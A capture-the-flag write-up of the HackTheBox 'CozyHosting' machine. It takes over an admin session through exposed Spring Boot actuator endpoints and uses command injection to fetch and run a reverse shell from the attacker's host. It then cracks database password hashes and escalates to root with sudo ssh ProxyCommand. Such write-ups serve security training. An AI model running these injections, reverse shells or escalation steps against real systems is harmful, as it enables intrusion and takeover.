---
title: CozyHosting
tags:
  - HackTheBox
  - Easy
  - Linux
  - Springboot
  - Cookie-Stealing
  - Command-Injection
  - jar
  - Postgresql
  - Brute-Forcing
  - Sudo-Vulnerability
date: 2025-02-08T00:00:00Z
---
![](Pasted%20image%2020250208213751.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- cozyhosting.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http
|_http-title: Cozy Hosting - Home
```

So I checked its website:

![](Pasted%20image%2020250208213944.png)

Now I decided to perform some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

[redacted]
[21:46:04] 200 -    4KB - /login                                            
[21:46:04] 401 -   97B  - /admin                                            
[21:46:07] 204 -    0B  - /logout 
```

So I inspected the `/login` endpoint:

![](Pasted%20image%2020250208214954.png)

And also the `/error` endpoint:

![](Pasted%20image%2020250208215029.png)

Searching over the internet we get that this error is typical from springboot:

![](Pasted%20image%2020250208215127.png)

So I'll perform some further enumeration with another wordlist:

```shell
dirsearch -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt

[redacted]
[21:52:22] 200 -  634B  - /actuator                                         
[21:52:22] 200 -  487B  - /actuator/env/path                                
[21:52:22] 200 -   15B  - /actuator/health                                  
[21:52:22] 200 -  487B  - /actuator/env/home                                
[21:52:22] 200 -    5KB - /actuator/env                                     
[21:52:22] 200 -  487B  - /actuator/env/lang
[21:52:22] 200 -   10KB - /actuator/mappings                                
[21:52:22] 200 -  148B  - /actuator/sessions                                
[21:52:22] 200 -  124KB - /actuator/beans 
```

Upon exploring `/actuator` different endpoints I got into `/mappings`, which provides a detailed overview of the mappings of the app:

![](Pasted%20image%2020250208215840.png)

I noticed the endpoint `/sessions`, which displays all the active sessions:

![](Pasted%20image%2020250208220201.png)

There's an active session of a user called `kanderson`:

![](Pasted%20image%2020250208220220.png)

> I got the admin cookie :D

So I changed the cookie and accessed the admin portal:

![](Pasted%20image%2020250208220357.png)

I decided to test the "automatic patching" function:

![](Pasted%20image%2020250208220619.png)

Got and error:

![](Pasted%20image%2020250208220642.png)

So I suppose that this function tries to connect to a host using a private ssh key like:

```shell
ssh -i ird_rsa username@hostname
```

So I'll try some command injections against the `username` field:

```shell
# First I set up a python server
python3 -m http.server 8090
user;curl http://10.10.14.21:8090;
```

![](Pasted%20image%2020250208221031.png)

I got an error so that username can't contain whitespaces, so I'll use `${IFS}`, which is a Unix Environment Variable that stans for Internal Field Separator
- For more info check [Unix Environment Variables 🌋](/notes/Linux%20things/special_unix_environment_variables.md)

```shell
user;curl${IFS}http://10.10.14.21:8090;
```

Got the request!

![](Pasted%20image%2020250208221453.png)

## Exploitation

So now I can create a reverse shell in my machine, upload to the host and then execute it:

```shell
# First, create the shell in our machine
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.21/666 0>&1' > shell.sh
# Now download it in the host (Command Injection) and execute it
user;curl${IFS}http://10.10.14.21:8090/shell.sh|bash;
```

> Got a reverse shell :D

![](Pasted%20image%2020250208222230.png)

## Pivoting

There is a user called `josh` int the machine. Also, there is a `.jar` file inside the `/app` directory called `cloudhosting-0.0.1.jar`. We can extract the content of the `.jar` to examine it:

```shell
unzip -d /dev/shm cloudhosting-0.0.1.jar

ls -la
total 28
drwxrwxrwt  5 root     root       120 Feb  8 21:28 .
drwxr-xr-x 19 root     root      3980 Feb  7 18:34 ..
drwxr-xr-x  4 app      app        120 Aug 10  2023 BOOT-INF
drwxr-xr-x  3 app      app         80 Aug 10  2023 META-INF
drwxr-xr-x  3 app      app         60 Feb  1  1980 org
-rw-------  1 postgres postgres 26976 Feb  7 18:34 PostgreSQL.3698546292
```

I can try to read `BOOT-INF/classes/application.properties` in spite of finding some creds:

```shell
cat BOOT-INF/classes/application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

> Got creds for the database :D `postgres:Vg&nvzAQ7XxR`

I connected to the database using **psql**:

```shell
psql -h 127.0.0.1 -p 5432 -U postgres
```

![](Pasted%20image%2020250208223635.png)

I listed the databases using `\l`:

![](Pasted%20image%2020250208223601.png)

Then I switched to the `cozyhosting` database:

```shell
\c cozyhosting
```

![](Pasted%20image%2020250208223817.png)

Now I listed the content of it:

```shell
\dt
```

![](Pasted%20image%2020250208223846.png)

Now I list all the info of table `users`:

```sql
SELECT * FROM users;
```

![](Pasted%20image%2020250208224057.png)

```sql
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

I'll now crack `admin` hash using **Hashcat** (which seems to be using bcrypt):
- Check [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md)

```shell
hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

> We finally got user creds :D `josh:manchesterunited`

### User flag

![](Pasted%20image%2020250208224835.png)

## Privilege Escalation

If we check for sudo privileges:

```shell
sudo -l

[redacted]
(root) /usr/bin/ssh *
```

So searching over the internet we find this bypass at [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/):

```shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![](Pasted%20image%2020250208225229.png)

### Root flag

![](Pasted%20image%2020250208225245.png)

==Machine pwned!==
